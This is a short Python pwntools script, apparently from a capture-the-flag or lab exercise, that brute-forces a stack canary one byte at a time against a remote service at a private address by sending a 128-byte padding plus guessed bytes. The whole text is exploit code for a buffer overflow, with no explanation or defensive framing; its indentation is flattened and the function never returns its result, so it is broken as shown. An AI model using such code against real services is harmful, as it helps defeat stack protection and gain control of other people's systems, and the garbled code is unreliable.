from pwn import *
def getthatbuf(base):
canary = ""
now = 40
base = base + canary
while(now<=255):
try:
r = remote("192.168.2.83",1004)
r.sendline("132")
#r.recvuntil("Now enter the string")
r.send(base + chr(now))
print("Printing the payload..", base + chr(now))
data = r.recvall()
print("Strings: ", str(data))
substring = "you said something"
if(substring in data):
print("the canary byte",format(now,'02x'))
canary+=chr(now)
base +=chr(now)
r.close()
break
else:
print("incrementing\n")
now+=1
r.close()
except EOFError:
print("trying again ..\n")
offset = 128
base = "A" * offset
base = base + "7" + "a" + "8"
print("Brute Forcing Canary")
base_canary = getthatbuf(base)
#
